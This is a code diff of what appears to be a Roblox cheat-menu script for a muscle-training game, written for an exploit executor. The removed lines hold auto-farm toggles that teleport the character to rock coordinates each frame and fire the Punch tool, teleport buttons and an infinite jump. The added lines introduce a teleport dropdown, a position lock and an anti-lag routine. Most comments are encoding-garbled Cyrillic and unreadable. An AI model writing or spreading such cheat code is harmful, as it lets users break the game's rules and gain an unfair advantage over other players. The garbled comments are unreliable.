-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Toggle17 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Eternal Rock (750.000)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(-7262.18701, -0.359961987, -1259.24426, 1, 0, 0, 0, 1, 0, 0, 0, 1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Toggle18 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Legend Rock (1.000.000)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(4140.41797, 987.453186, -4089.34937, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Toggle19 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Muscle King Rock (5.000.000, Recommended size 5)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(-9029.7959, 5.53625202, -6026.74268, 0.276099414, -9.5099395e-09, -0.961129069, -3.1277569e-08, 1, -1.88795219e-08, 0.961129069, 3.52744038e-08, 0.276099414)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Toggle20 = Tabs.Glitching:AddToggle("MyToggle", 
-{
-    Title = "Auto Jungle Rock (10.000.000)", 
-    Default = false,
-    Callback = function(state)
-	autoMode = state
-    
-    if state then
-        
-        
-        local player = game.Players.LocalPlayer
-        local toolName = "Punch"
-        local targetCFrame = CFrame.new(-7611.20166, 32.4031715, 2909.97168, -1, 0, 0, 0, 1, 0, 0, 0, -1)
-        
-        -- РћС‡РёСЃС‚РєР° РїСЂРµРґС‹РґСѓС‰РёС… РїРѕРґРєР»СЋС‡РµРЅРёР№
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-        
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СѓРїСЂР°РІР»РµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶РµРј
-        local function setupCharacter(character)
-            local humanoid = character:WaitForChild("Humanoid")
-            
-            -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-            local function equipPunch()
-                local backpack = player:FindFirstChildOfClass("Backpack")
-                if backpack then
-                    local tool = backpack:FindFirstChild(toolName)
-                    if tool and not character:FindFirstChild(toolName) then
-                        tool.Parent = character
-                        tool:Equip()
-                        return true
-                    end
-                end
-                return false
-            end
-            
-            -- Р¤СѓРЅРєС†РёСЏ Р°С‚Р°РєРё СЃ С‚РµР»РµРїРѕСЂС‚Р°С†РёРµР№
-            local function startAttackLoop()
-                if connections.attack then connections.attack:Disconnect() end
-                
-                connections.attack = game:GetService("RunService").Heartbeat:Connect(function()
-                    if autoMode and character and character.PrimaryPart then
-                        -- РўРµР»РµРїРѕСЂС‚Р°С†РёСЏ Рє С†РµР»Рё
-                        character:SetPrimaryPartCFrame(targetCFrame)
-                        
-                        -- РџРѕРёСЃРє РёРЅСЃС‚СЂСѓРјРµРЅС‚Р° РґР»СЏ Р°С‚Р°РєРё
-                        local tool = character:FindFirstChild(toolName) or character:FindFirstChildOfClass("Tool")
-                        if tool then
-                            tool:Activate()
-                            task.wait(0.01) -- РћРїС‚РёРјР°Р»СЊРЅР°СЏ Р·Р°РґРµСЂР¶РєР° РјРµР¶РґСѓ СѓРґР°СЂР°РјРё
-                        end
-                    end
-                end)
-            end
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РёРЅСЃС‚СЂСѓРјРµРЅС‚Р°
-            connections.toolAdded = character.ChildAdded:Connect(function(child)
-                if child.Name == toolName or child:IsA("Tool") then
-                    startAttackLoop()
-                end
-            end)
-            
-            -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-            connections.died = humanoid.Died:Connect(function()
-                task.wait(1.2) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РіР°СЂР°РЅС‚РёСЂРѕРІР°РЅРЅРѕРіРѕ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                if autoMode and player.Character then
-                    equipPunch()
-                end
-            end)
-            
-            -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-            if equipPunch() then
-                startAttackLoop()
-            end
-        end
-        
-        -- РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        if player.Character then
-            setupCharacter(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡РµРЅРёРµ РґР»СЏ РЅРѕРІС‹С… РїРµСЂСЃРѕРЅР°Р¶РµР№
-        connections.characterAdded = player.CharacterAdded:Connect(setupCharacter)
-        
-    else
-        
-        for _, conn in pairs(connections) do
-            conn:Disconnect()
-        end
-        connections = {}
-    end
-end
-})
-
-local Section8 = Tabs.Glitching:AddSection("Buy pets (Coming soon...)")
-
--- СЃРґРµР»Р°С‚СЊ С„СѓРЅРєС†РёСЋ РїРѕРєСѓРїРєРё РїРµС‚РѕРІ Рё Р°СѓСЂ
+local Section8 = Tabs.PaidTab:AddSection("Buy pets (Coming soon...)")
 
 -- Teleport
 
 local Section9 = Tabs.Teleport:AddSection("Locations")
 
-Tabs.Teleport:AddButton({
-    Title = "Spawn",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5.41369724, 7.32069302, 103.353584, 0.998408794, 1.33323566e-08, -0.0563899279, -1.14453016e-08, 1, 3.37873658e-08, 0.0563899279, -3.30882024e-08, 0.998408794)   
-    end
+local TPDropdown = Tabs.Teleport:AddDropdown("Dropdown", {
+    Title = "Choose location to TP",
+    Values = {"Spawn", "Secret Island", "Tiny Island", "Frost Island", "Purple Island", "Eternal Island", "Legends Island", "Muscle King Island", "Jungle Island"},
+    Multi = false,
+    Default = 1,
 })
 
-Tabs.Teleport:AddButton({
-    Title = "Secret Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1947, 1.7988528, 6191, 1, -1.38381895e-09, 2.73059163e-14, 1.38381895e-09, 1, -4.17202584e-09, -2.73001429e-14, 4.17202584e-09, 1)   
+TPDropdown:OnChanged(function(Value)
+    local CFrameTable = {
+        ["Spawn"] = CFrame.new(5.41369724, 7.32069302, 103.353584, 0.998408794, 1.33323566e-08, -0.0563899279, -1.14453016e-08, 1, 3.37873658e-08, 0.0563899279, -3.30882024e-08, 0.998408794),
+        ["Secret Island"] = CFrame.new(1947, 1.7988528, 6191, 1, -1.38381895e-09, 2.73059163e-14, 1.38381895e-09, 1, -4.17202584e-09, -2.73001429e-14, 4.17202584e-09, 1),
+        ["Tiny Island"] = CFrame.new(-33.9999962, 7.47380733, 1903, 1, -3.2191803e-08, 4.68168527e-13, 3.2191803e-08, 1, -9.70561231e-08, -4.65044127e-13, 9.70561231e-08, 1),
+        ["Frost Island"] = CFrame.new(-2623.02222, 7.32069302, -409.073334, -1.37775425e-13, 2.1388237e-08, 1, 1.76718853e-08, 1, -2.1388237e-08, -1, 1.76718853e-08, -1.38153405e-13),
+        ["Purple Island"] = CFrame.new(2316.8728, 7.32069254, 1083.15601, 0.356475145, -6.32208952e-08, -0.934304833, 9.51965546e-08, 1, -3.13448965e-08, 0.934304833, -7.77689237e-08, 0.356475145),
+        ["Eternal Island"] = CFrame.new(-6758.96387, 7.32070589, -1284.9187, 3.68920965e-15, 3.28636962e-09, 1, 4.94521082e-08, 1, -3.28636962e-09, -1, 4.94521082e-08, 3.52669177e-15),
+        ["Legends Island"] = CFrame.new(4603.28174, 991.49707, -3897.86572, -0.173624292, 5.4785918e-08, 0.984811962, 2.12412345e-08, 1, -5.18859693e-08, -0.984811962, 1.19099584e-08, -0.173624292),
+        ["Muscle King Island"] = CFrame.new(-8748.88184, 27.2870579, -5857.51807, 0.979979336, 1.53297641e-08, 0.199099228, -9.27019528e-09, 1, -3.13670938e-08, -0.199099228, 2.88934139e-08, 0.979979336),
+        ["Jungle Island"] = CFrame.new(-8685.62109, 6.74931479, 2392.32666, 4.55405274e-15, 6.11310058e-10, -1, -4.45797982e-10, 1, 6.11310058e-10, 1, 4.45797982e-10, 4.55432548e-15)
+    }
+    
+    if CFrameTable[Value] then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameTable[Value]
     end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Tiny Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-33.9999962, 7.47380733, 1903, 1, -3.2191803e-08, 4.68168527e-13, 3.2191803e-08, 1, -9.70561231e-08, -4.65044127e-13, 9.70561231e-08, 1)   
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Frost Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2623.02222, 7.32069302, -409.073334, -1.37775425e-13, 2.1388237e-08, 1, 1.76718853e-08, 1, -2.1388237e-08, -1, 1.76718853e-08, -1.38153405e-13)  
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Purple Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2316.8728, 7.32069254, 1083.15601, 0.356475145, -6.32208952e-08, -0.934304833, 9.51965546e-08, 1, -3.13448965e-08, 0.934304833, -7.77689237e-08, 0.356475145)
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Eternal Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6758.96387, 7.32070589, -1284.9187, 3.68920965e-15, 3.28636962e-09, 1, 4.94521082e-08, 1, -3.28636962e-09, -1, 4.94521082e-08, 3.52669177e-15)   
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Legends Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4603.28174, 991.49707, -3897.86572, -0.173624292, 5.4785918e-08, 0.984811962, 2.12412345e-08, 1, -5.18859693e-08, -0.984811962, 1.19099584e-08, -0.173624292)   
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Muscle King Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8748.88184, 27.2870579, -5857.51807, 0.979979336, 1.53297641e-08, 0.199099228, -9.27019528e-09, 1, -3.13670938e-08, -0.199099228, 2.88934139e-08, 0.979979336)   
-    end
-})
-
-Tabs.Teleport:AddButton({
-    Title = "Jungle Island",
-    Callback = function()
-     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8685.62109, 6.74931479, 2392.32666, 4.55405274e-15, 6.11310058e-10, -1, -4.45797982e-10, 1, 6.11310058e-10, 1, 4.45797982e-10, 4.55432548e-15)   
-    end
-})
+end)
 
 -- Misc
 
@@ -1969,7 +954,6 @@ local Toggle21 = Tabs.Misc:AddToggle("MyToggle",
     Default = false,
     Callback = function(state)
 	if state then
-        -- Р’РєР»СЋС‡Р°РµРј РїР»Р°С‚С„РѕСЂРјСѓ
         local platform = Instance.new("Part")
         platform.Name = "FullMapPlatform"
         platform.Size = Vector3.new(50000, 10, 50000)
@@ -1978,9 +962,8 @@ local Toggle21 = Tabs.Misc:AddToggle("MyToggle",
         platform.CanCollide = true
         platform.Transparency = 0.5
         platform.Parent = workspace
-        getgenv().platform = platform  -- РЎРѕС…СЂР°РЅСЏРµРј РІ РїРµСЂРµРјРµРЅРЅСѓСЋ РґР»СЏ СѓРґР°Р»РµРЅРёСЏ
+        getgenv().platform = platform
     else
-        -- Р’С‹РєР»СЋС‡Р°РµРј Рё СѓРґР°Р»СЏРµРј РїР»Р°С‚С„РѕСЂРјСѓ
         if getgenv().platform then
             getgenv().platform:Destroy()
             getgenv().platform = nil
@@ -1991,35 +974,22 @@ end
 
 local Toggle22 = Tabs.Misc:AddToggle("MyToggle", 
 {
-    Title = "Infinity Jump", 
+    Title = "Lock Position", 
     Default = false,
     Callback = function(state)
-	local UserInputService = game:GetService("UserInputService")
-    local Player = game.Players.LocalPlayer
-    local Character = Player.Character or Player.CharacterAdded:Wait()
-    local Humanoid = Character:WaitForChild("Humanoid")
-    
-    if _G.InfiniteJumpConnection then
-        _G.InfiniteJumpConnection:Disconnect()
-        _G.InfiniteJumpConnection = nil
-    end
-
-    if state then
-        -- РџРѕРґРєР»СЋС‡Р°РµРј СЃРѕР±С‹С‚РёРµ РЅР° Р·Р°РїСЂРѕСЃ РїСЂС‹Р¶РєР°
-        _G.InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
-            Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-        end)
-        
-        -- РћР±СЂР°Р±РѕС‚С‡РёРє РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-        Player.CharacterAdded:Connect(function()
-            if state then
-                task.wait(0.5) -- РќРµР±РѕР»СЊС€Р°СЏ Р·Р°РґРµСЂР¶РєР° РїРѕСЃР»Рµ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
-                Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
-        end)
-    else
-    end
-end
+	if state then
+			local currentPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+			getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
+				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = currentPos
+				end
+			end)
+		else
+			if getgenv().posLock then
+				getgenv().posLock:Disconnect()
+			end
+		end
+	end
 })
 
 local Toggle23 = Tabs.Misc:AddToggle("MyToggle",
@@ -2059,66 +1029,24 @@ local Toggle24 = Tabs.Misc:AddToggle("MyToggle",
     Title = "Anti Lag", 
     Default = false,
     Callback = function(state)
-	antiLagEnabled = state
-    
-    if state then
-        
-        -- РўР°Р±Р»РёС†Р° РґР»СЏ С…СЂР°РЅРµРЅРёСЏ РѕСЂРёРіРёРЅР°Р»СЊРЅС‹С… РјР°С‚РµСЂРёР°Р»РѕРІ
-        local originalMaterials = {}
-        local originalReflectance = {}
-        
-        local function optimizeObjects()
-            for _, v in pairs(Workspace:GetDescendants()) do
-                if v:IsA("BasePart") and not v.Parent:IsA("Model") then
-                    -- РЎРѕС…СЂР°РЅСЏРµРј РѕСЂРёРіРёРЅР°Р»СЊРЅС‹Рµ Р·РЅР°С‡РµРЅРёСЏ
-                    originalMaterials[v] = v.Material
-                    originalReflectance[v] = v.Reflectance
-                    
-                    -- РџСЂРёРјРµРЅСЏРµРј РѕРїС‚РёРјРёР·Р°С†РёРё
-                    v.Material = Enum.Material.SmoothPlastic
-                    v.Reflectance = 0
-                end
-            end
-        end
-        
-        local function restoreObjects()
-            for part, material in pairs(originalMaterials) do
-                if part:IsA("BasePart") then
-                    part.Material = material
-                    part.Reflectance = originalReflectance[part] or 0
-                end
-            end
-            table.clear(originalMaterials)
-            table.clear(originalReflectance)
-        end
-        
-        -- РћР±СЂР°Р±РѕС‚С‡РёРє РґРѕР±Р°РІР»РµРЅРёСЏ РЅРѕРІС‹С… РѕР±СЉРµРєС‚РѕРІ
-        local descendantAddedConnection
-        descendantAddedConnection = Workspace.DescendantAdded:Connect(function(descendant)
-            if antiLagEnabled and descendant:IsA("BasePart") and not descendant.Parent:IsA("Model") then
-                originalMaterials[descendant] = descendant.Material
-                originalReflectance[descendant] = descendant.Reflectance
-                descendant.Material = Enum.Material.SmoothPlastic
-                descendant.Reflectance = 0
-            end
-        end)
-        
-        -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РѕРїС‚РёРјРёР·Р°С†РёСЏ
-        optimizeObjects()
-        
-        -- Р¤СѓРЅРєС†РёСЏ РґРµР°РєС‚РёРІР°С†РёРё
-        local function deactivate()
-            restoreObjects()
-            if descendantAddedConnection then
-                descendantAddedConnection:Disconnect()
-            end
-        end
-        
-        return deactivate
-        
-    else
+	for _, v in pairs(game:GetDescendants()) do
+			if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
+				v.Enabled = false
+			end
+		end
+		local lighting = game:GetService("Lighting")
+		lighting.GlobalShadows = false
+		lighting.FogEnd = 9e9
+		for _, v in pairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
+				v.Material = Enum.Material.SmoothPlastic
+				if v:IsA("Texture") then
+					v:Destroy()
+				end
+			end
+		end
+		settings().Rendering.QualityLevel = 0
     end
-end
 })
 
 Tabs.Misc:AddButton({
@@ -2128,101 +1056,14 @@ Tabs.Misc:AddButton({
     end
 })
 
-local Toggle25 = Tabs.Misc:AddToggle("AutoSpinWheel", 
-{
-    Title = "Auto Spin Wheel", 
-    Description = "Автоматически крутит колесо фортуны",
-    Default = false,
-    Callback = function(state)
-        _G.AutoSpinWheel = state
-        
-        if state then
-            spawn(function()
-                while _G.AutoSpinWheel and wait(1) do
